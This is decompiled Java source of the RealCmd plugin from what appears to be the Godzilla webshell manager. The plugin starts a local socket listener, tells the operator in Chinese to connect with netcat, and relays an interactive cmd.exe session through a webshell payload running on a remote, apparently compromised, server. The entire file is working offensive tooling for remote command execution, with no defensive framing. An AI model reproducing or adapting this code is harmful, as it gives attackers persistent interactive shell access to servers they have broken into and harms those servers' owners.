/*     */ package shells.plugins.generic;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.ByteArrayOutputStream;
/*     */ import java.io.IOException;
/*     */ import java.io.InputStream;
/*     */ import java.io.OutputStream;
/*     */ import java.net.InetAddress;
/*     */ import java.net.InetSocketAddress;
/*     */ import java.net.ServerSocket;
/*     */ import java.net.Socket;
/*     */ import java.util.ArrayList;
/*     */ import java.util.Arrays;
/*     */ import java.util.concurrent.locks.Lock;
/*     */ import java.util.concurrent.locks.ReentrantLock;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.UiFunction;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ public abstract class RealCmd
/*     */   implements Plugin
/*     */ {
/*     */   private JPanel panel;
/*     */   private RTextArea tipTextArea;
/*     */   private JButton StartButton;
/*     */   private JButton StopButton;
/*     */   private JLabel hostLabel;
/*     */   private JLabel portLabel;
/*     */   private JLabel pollingSleepLabel;
/*     */   private JLabel execFileLabel;
/*     */   private JTextField hostTextField;
/*     */   private JTextField portTextField;
/*     */   private JTextField execFileTextField;
/*     */   
/*     */   public RealCmd() {
/*  53 */     this.panel = new JPanel(new BorderLayout());
/*  54 */     this.pollingSleepLabel = new JLabel("polling Sleep(ms)");
/*  55 */     this.execFileLabel = new JLabel("exec file");
/*  56 */     this.hostLabel = new JLabel("BindHost :");
/*  57 */     this.portLabel = new JLabel("BindPort :");
/*  58 */     this.StartButton = new JButton("Start");
/*  59 */     this.StopButton = new JButton("Stop");
/*  60 */     this.tipTextArea = new RTextArea();
/*  61 */     this.pollingSleepTextField = new JTextField("1000", 7);
/*  62 */     this.execFileTextField = new JTextField("cmd.exe", 30);
/*  63 */     this.hostTextField = new JTextField("127.0.0.1", 15);
/*  64 */     this.portTextField = new JTextField("4444", 7);
/*  65 */     this.realSplitPane = new JSplitPane();
/*     */ 
/*     */     
/*  68 */     this.tipTextArea.setText(new String(functions.readInputStreamAutoClose(RealCmd.class.getResourceAsStream("assets/realCmd.txt"))));
/*     */ 
/*     */     
/*  71 */     this.clients = new ArrayList<>();
/*     */ 
/*     */     
/*  74 */     this.realSplitPane.setOrientation(0);
/*  75 */     this.realSplitPane.setDividerSize(0);
/*     */     
/*  77 */     JPanel realTopPanel = new JPanel();
/*  78 */     realTopPanel.add(this.pollingSleepLabel);
/*  79 */     realTopPanel.add(this.pollingSleepTextField);
/*  80 */     realTopPanel.add(this.execFileLabel);
/*  81 */     realTopPanel.add(this.execFileTextField);
/*  82 */     realTopPanel.add(this.hostLabel);
/*  83 */     realTopPanel.add(this.hostTextField);
/*  84 */     realTopPanel.add(this.portLabel);
/*  85 */     realTopPanel.add(this.portTextField);
/*  86 */     realTopPanel.add(this.StartButton);
/*  87 */     realTopPanel.add(this.StopButton);
/*     */     
/*  89 */     this.realSplitPane.setTopComponent(realTopPanel);
/*  90 */     this.realSplitPane.setBottomComponent(new JScrollPane((Component)this.tipTextArea));
/*     */ 
/*     */     
/*  93 */     this.sleepTime = new Integer(this.pollingSleepTextField.getText());
/*     */     
/*  95 */     this.panel.add(this.realSplitPane);
/*     */   }
/*     */   private JTextField pollingSleepTextField; private JSplitPane realSplitPane; private boolean loadState; private ShellEntity shellEntity; private Payload payload; private Encoding encoding; private ArrayList<Socket> clients; private boolean isRuning; private ByteArrayOutputStream bufferByteArrayOutputStream; private Integer sleepTime; private ServerSocket serverSocket;
/*     */   public synchronized void StartButtonClick(ActionEvent actionEvent) {
/*  99 */     load();
/* 100 */     if (!this.isRuning) {
/* 101 */       int port = Integer.parseInt(this.portTextField.getText());
/* 102 */       String host = this.hostTextField.getText();
/*     */       
/* 104 */       InetSocketAddress socketAddress = startRealCmd(port, host, this.execFileTextField.getText(), Integer.valueOf(Integer.parseInt(this.pollingSleepTextField.getText())));
/* 105 */       if (socketAddress != null) {
/* 106 */         String tipStr = String.format("已开启终端请使用netcat连接host:%s,port:%s", new Object[] { socketAddress.getHostName(), Integer.valueOf(socketAddress.getPort()) });
/* 107 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), tipStr, "提示", 1);
/* 108 */         Log.log(tipStr, new Object[0]);
/*     */       } else {
/* 110 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已有终端在运行 无法再次开启", "提示", 2);
/*     */       } 
/*     */     } else {
/* 113 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已有终端在运行 无法再次开启", "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   public InetSocketAddress startRealCmd(int port, String host, final String cmd, final Integer sleepTime) {
/* 118 */     load();
/* 119 */     if (!this.isRuning) {
/*     */       try {
/* 121 */         this.isRuning = true;
/* 122 */         this.serverSocket = new ServerSocket(port, 1, InetAddress.getByName(host));
/* 123 */         (new Thread(new Runnable()
/*     */             {
/*     */               public void run() {
/* 126 */                 Socket client = null;
/*     */                 try {
/* 128 */                   client = RealCmd.this.serverSocket.accept();
/* 129 */                   RealCmd.this.clients.add(client);
/* 130 */                   RealCmd.this.serverSocket.close();
/* 131 */                   RealCmd.RunCmd runCmd = new RealCmd.RunCmd(client, sleepTime, RealCmd.this.payload);
/* 132 */                   runCmd.starAndWait(cmd, RealCmd.this.isTryStart());
/* 133 */                   RealCmd.this.clients.remove(client);
/* 134 */                   RealCmd.this.StopButtonClick(null);
/* 135 */                 } catch (Exception e) {
/* 136 */                   Log.error(e);
/*     */                 } finally {
/* 138 */                   RealCmd.this.isRuning = false;
/* 139 */                   if (client != null && !client.isClosed()) {
/*     */                     try {
/* 141 */                       client.close();
/* 142 */                     } catch (IOException e) {
/* 143 */                       Log.error(e);
/*     */                     } 
/*     */                   }
/*     */                 } 
/*     */               }
/* 148 */             })).start();
/* 149 */         return new InetSocketAddress(this.serverSocket.getInetAddress(), this.serverSocket.getLocalPort());
/* 150 */       } catch (Exception e) {
/* 151 */         this.isRuning = false;
/* 152 */         Log.error(e);
/* 153 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), e.getMessage());
/*     */       } 
/*     */     } else {
/* 156 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已有终端在运行 无法再次开启", "提示", 2);
/*     */     } 
/* 158 */     return null;
/*     */   }
/*     */   
/*     */   public void StopButtonClick(ActionEvent actionEvent) {
/* 162 */     load();
/*     */     
/*     */     try {
/* 165 */       if (this.serverSocket != null && !this.serverSocket.isClosed()) {
/* 166 */         this.serverSocket.close();
/*     */       }
/* 168 */     } catch (Exception e) {
/* 169 */       Log.error(e);
/*     */     } 
/*     */     
/* 172 */     ReqParameter reqParameter = new ReqParameter();
/* 173 */     reqParameter.add("action", "stop");
/* 174 */     byte[] result = this.payload.evalFunc(getClassName(), "realCmd", reqParameter);
/* 175 */     if (Arrays.equals("ok".getBytes(), result)) {
/* 176 */       GOptionPane.showMessageDialog(getView(), "stop ok", "提示", 1);
/* 177 */     } else if (result != null) {
/* 178 */       GOptionPane.showMessageDialog(getView(), this.encoding.Decoding(result), "提示", 2);
/*     */     } else {
/* 180 */       GOptionPane.showMessageDialog(getView(), "fail", "提示", 2);
/*     */     } 
/* 182 */     this.isRuning = false;
/*     */   }
/*     */   private void load() {
/* 185 */     if (!this.loadState) {
/*     */       try {
/* 187 */         if (this.payload.include(getClassName(), readPlugin())) {
/* 188 */           this.loadState = true;
/* 189 */           Log.log("Load success", new Object[0]);
/*     */         } else {
/* 191 */           Log.log("Load fail", new Object[0]);
/*     */         } 
/* 193 */       } catch (Exception e) {
/* 194 */         Log.error(e);
/*     */       } 
/*     */     }
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean isTryStart() {
/* 201 */     return false;
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 206 */     this.shellEntity = shellEntity;
/* 207 */     this.payload = this.shellEntity.getPayloadModule();
/* 208 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 209 */     automaticBindClick.bindJButtonClick(RealCmd.class, this, RealCmd.class, this);
/*     */   }
/*     */   
/*     */   public void closePlugin() {
/* 213 */     this.clients.stream().forEach(socket -> {
/*     */           if (!socket.isClosed()) {
/*     */             try {
/*     */               if (!socket.isClosed()) {
/*     */                 socket.close();
/*     */               }
/*     */               StopButtonClick(null);
/* 220 */             } catch (IOException e) {
/*     */               Log.error(e);
/*     */             } 
/*     */           }
/*     */         });
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 230 */     return this.panel;
/*     */   }
/*     */   
/*     */   public abstract byte[] readPlugin();
/*     */   
/*     */   public abstract String getClassName();
/*     */   
/*     */   class RunCmd { Payload payload;
/*     */     int errNum;
/* 239 */     Lock lock = new ReentrantLock(); OutputStream outputStream;
/*     */     InputStream inputStream;
/*     */     Integer sleepTime;
/*     */     boolean alive;
/*     */     Thread ioThread;
/*     */     Thread oiThread;
/*     */     Socket socket;
/*     */     
/*     */     public RunCmd(Socket socket, Integer sleepTime, Payload payload) {
/*     */       try {
/* 249 */         this.alive = true;
/* 250 */         this.socket = socket;
/* 251 */         this.inputStream = socket.getInputStream();
/* 252 */         this.outputStream = socket.getOutputStream();
/* 253 */         this.payload = payload;
/* 254 */         this.sleepTime = sleepTime;
/* 255 */         this.oiThread = new Thread(() -> {
/*     */               try {
/*     */                 startOI();
/* 258 */               } catch (Exception e) {
/*     */                 try {
/*     */                   if (!socket.isClosed()) {
/*     */                     socket.close();
/*     */                   }
/* 263 */                 } catch (IOException ioException) {
/*     */                   ioException.printStackTrace();
/*     */                 } 
/*     */                 Log.error(e);
/*     */               } finally {
/*     */                 this.alive = false;
/*     */               } 
/*     */             });
/* 271 */         this.ioThread = new Thread(() -> {
/*     */               try {
/*     */                 startIO();
/* 274 */               } catch (Exception e) {
/*     */                 try {
/*     */                   if (!socket.isClosed()) {
/*     */                     socket.close();
/*     */                   }
/* 279 */                 } catch (IOException ioException) {
/*     */                   ioException.printStackTrace();
/*     */                 } 
/*     */                 Log.error(e);
/*     */               } finally {
/*     */                 this.alive = false;
/*     */               } 
/*     */             });
/* 287 */       } catch (Exception e) {
/* 288 */         Log.error(e);
/*     */       } 
/*     */     }
/*     */     
/*     */     public void starAndWait(String commandStr, boolean isTryStrat) throws Exception {
/* 293 */       ReqParameter parameter = new ReqParameter();
/* 294 */       parameter.add("action", "start");
/* 295 */       parameter.add("cmdLine", RealCmd.this.encoding.Encoding(commandStr));
/*     */       
/* 297 */       String[] commandArgs = functions.SplitArgs(commandStr);
/* 298 */       for (int i = 0; i < commandArgs.length; i++) {
/* 299 */         parameter.add(String.format("arg-%d", new Object[] { Integer.valueOf(i) }), RealCmd.this.encoding.Encoding(commandArgs[i]));
/*     */       } 
/* 301 */       parameter.add("argsCount", String.valueOf(commandArgs.length));
/*     */       
/* 303 */       String[] executableArgs = functions.SplitArgs(commandStr, 1, false);
/*     */       
/* 305 */       if (executableArgs.length > 0) {
/* 306 */         parameter.add("executableFile", executableArgs[0]);
/* 307 */         if (executableArgs.length >= 2) {
/* 308 */           parameter.add("executableArgs", executableArgs[1]);
/*     */         }
/*     */       } 
/* 311 */       if (!isTryStrat) {
/* 312 */         byte[] res = this.payload.evalFunc(RealCmd.this.getClassName(), "realCmd", parameter);
/* 313 */         if (res != null) {
/* 314 */           this.outputStream.write(res);
/* 315 */           if (Arrays.equals("ok".getBytes(), res)) {
/* 316 */             this.ioThread.start();
/* 317 */             this.oiThread.start();
/* 318 */             this.oiThread.join();
/* 319 */             closeSocket();
/* 320 */             this.ioThread.join();
/* 321 */             closeSocket();
/*     */           } 
/*     */         } 
/*     */       } else {
/* 325 */         (new Thread(() -> this.payload.evalFunc(RealCmd.this.getClassName(), "realCmd", parameter))).start();
/* 326 */         Thread.sleep(1500L);
/* 327 */         this.ioThread.start();
/* 328 */         this.oiThread.start();
/* 329 */         this.oiThread.join();
/* 330 */         closeSocket();
/* 331 */         this.ioThread.join();
/* 332 */         closeSocket();
/*     */       } 
/*     */     }
/*     */     private void startIO() throws Exception {
/* 336 */       byte[] buffer = new byte[521];
/* 337 */       int readNum = -1;
/* 338 */       while ((readNum = this.inputStream.read(buffer)) != -1 && this.alive) {
/* 339 */         ReqParameter reqParameter = new ReqParameter();
/* 340 */         reqParameter.add("action", "processWriteData");
/* 341 */         reqParameter.add("processWriteData", Arrays.copyOf(buffer, readNum));
/* 342 */         byte[] res = sendHandle(reqParameter);
/* 343 */         if (res != null) {
/* 344 */           if (res.length == 0) {
/*     */             return;
/*     */           }
/* 347 */           if (res[0] == 5) {
/* 348 */             writeToClientStream(Arrays.copyOfRange(res, 1, res.length), false); continue;
/*     */           } 
/* 350 */           writeToClientStream(res, true);
/* 351 */           Log.error(String.format("RealCmd processWriteDataErr :%s", new Object[] { new String(res) }));
/*     */           return;
/*     */         } 
/*     */       } 
/*     */     }
/*     */     
/*     */     private void startOI() throws Exception {
/* 358 */       while (this.alive) {
/* 359 */         Thread.sleep(this.sleepTime.longValue());
/* 360 */         ReqParameter reqParameter = new ReqParameter();
/* 361 */         reqParameter.add("action", "getResult");
/* 362 */         byte[] res = sendHandle(reqParameter);
/* 363 */         if (res != null) {
/* 364 */           if (res.length == 0) {
/*     */             return;
/*     */           }
/* 367 */           if (res[0] == 5) {
/* 368 */             writeToClientStream(Arrays.copyOfRange(res, 1, res.length), false); continue;
/*     */           } 
/* 370 */           writeToClientStream(res, true);
/* 371 */           Log.error(String.format("RealCmd processWriteDataErr :%s", new Object[] { new String(res) }));
/*     */           return;
/*     */         } 
/*     */       } 
/*     */     }
/*     */ 
/*     */     
/*     */     public void writeToClientStream(byte[] data, boolean canEncode) throws IOException {
/* 379 */       if (canEncode) {
/* 380 */         this.outputStream.write(RealCmd.this.encoding.Decoding(data).getBytes());
/*     */       } else {
/* 382 */         this.outputStream.write(data);
/*     */       } 
/*     */     }
/*     */ 
/*     */     
/*     */     public byte[] sendHandle(ReqParameter reqParameter) {
/* 388 */       if (this.errNum > 10) {
/* 389 */         return "The number of errors exceeded the limit".getBytes();
/*     */       }
/* 391 */       this.lock.lock();
/* 392 */       byte[] ret = null;
/*     */       try {
/* 394 */         ret = this.payload.evalFunc(RealCmd.this.getClassName(), "realCmd", reqParameter);
/* 395 */         this.errNum = 0;
/* 396 */       } catch (Exception e) {
/* 397 */         this.errNum++;
/* 398 */         Log.error(e);
/*     */       } 
/* 400 */       this.lock.unlock();
/* 401 */       return ret;
/*     */     }
/*     */     
/*     */     public void closeSocket() {
/*     */       try {
/* 406 */         if (this.socket != null && !this.socket.isClosed()) {
/* 407 */           this.socket.close();
/*     */         }
/* 409 */       } catch (Exception e) {
/* 410 */         Log.error(e);
/*     */       } 
/*     */     } }
/*     */ 
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\generic\RealCmd.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */